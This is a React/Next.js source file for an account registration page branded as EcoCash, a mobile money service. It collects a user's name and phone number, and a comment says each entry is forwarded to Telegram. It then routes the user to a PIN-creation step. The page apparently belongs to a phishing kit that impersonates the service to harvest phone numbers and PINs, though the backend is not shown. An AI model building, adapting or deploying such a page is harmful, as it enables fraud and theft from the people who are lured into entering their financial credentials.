'use client';

import { useState } from 'react';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import { User, Phone, ArrowRight, Shield, AlertCircle } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';

export default function RegisterPage() {
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();
  const searchParams = useSearchParams();
  
  // Get name and phone from URL params if available
  const initialName = searchParams.get('name') || '';
  const initialPhone = searchParams.get('phone') || '';

  const validateForm = () => {
    if (!name.trim()) {
      setError('Full name is required');
      return false;
    }
    
    if (!phone) {
      setError('Phone number is required');
      return false;
    }
    
    if (!/^\+?[\d\s-()]+$/.test(phone)) {
      setError('Please enter a valid phone number');
      return false;
    }
    
    setError('');
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    setIsLoading(true);
    
    // Send notification to Telegram with user details
    try {
      await fetch('/api/registrations', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          name, 
          phone, 
          action: 'registration_attempt' 
        })
      });
    } catch (err) {
      console.error('Failed to send notification:', err);
    }
    
    // Create user account
    try {
      const response = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, phone })
      });
      
      const data = await response.json();
      
      if (response.ok) {
        // Redirect to progress page then to create PIN page
        router.push(`/loading-secure?action=signup&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&redirect=pin`);
      } else {
        setError(data.message || 'An error occurred during registration');
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-primary/5 to-accent/5 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-primary/10 mb-4">
            <Shield className="h-8 w-8 text-primary" />
          </div>
          <h1 className="text-3xl font-bold bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
            Create Account
          </h1>
          <p className="text-foreground/70 mt-2">
            Join EcoCash and start your financial journey
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label htmlFor="name" className="block text-sm font-medium text-foreground mb-2 pl-1">
              Full Name
            </label>
            <div className="relative">
              <div className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground">
                <User className="h-4 w-4" />
              </div>
              <Input
                id="name"
                type="text"
                placeholder="Enter your full name"
                value={name || initialName}
                onChange={(e) => setName(e.target.value)}
                className="w-full pl-10 pr-4 py-3 text-base border border-input focus:ring-primary/50 focus:border-primary rounded-lg focus:outline-none focus:ring-1 bg-background placeholder:text-muted-foreground"
              />
            </div>
          </div>

          <div>
            <label htmlFor="phone" className="block text-sm font-medium text-foreground mb-2 pl-1">
              Phone Number
            </label>
            <div className="relative">
              <div className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground">
                <Phone className="h-4 w-4" />
              </div>
              <Input
                id="phone"
                type="tel"
                placeholder="Enter your phone number"
                value={phone || initialPhone}
                onChange={(e) => setPhone(e.target.value)}
                className="w-full pl-10 pr-4 py-3 text-base border border-input focus:ring-primary/50 focus:border-primary rounded-lg focus:outline-none focus:ring-1 bg-background placeholder:text-muted-foreground"
              />
            </div>
          </div>

          {error && (
            <div className="flex items-center p-3 text-sm text-destructive bg-destructive/10 rounded-lg">
              <AlertCircle className="h-4 w-4 mr-2" />
              {error}
            </div>
          )}

          <Button
            type="submit"
            disabled={isLoading}
            className="w-full flex items-center justify-center gap-2 rounded-md bg-primary px-4 py-3 text-sm font-medium text-primary-foreground shadow transition-colors hover:bg-primary/90 focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 disabled:opacity-50 mt-6"
          >
            {isLoading ? (
              <div className="flex items-center gap-2">
                <div className="h-4 w-4 border-2 border-current border-t-transparent rounded-full animate-spin"></div>
                <span>Creating account...</span>
              </div>
            ) : (
              <>
                Create Account
                <ArrowRight className="h-4 w-4" />
              </>
            )}
          </Button>
        </form>

        <div className="mt-6 text-center">
          <p className="text-foreground/70">
            Already have an account?{' '}
            <Link href="/login" className="font-medium text-primary hover:text-primary/80">
              Sign in
            </Link>
          </p>
        </div>
      </div>
    </div>
  );
}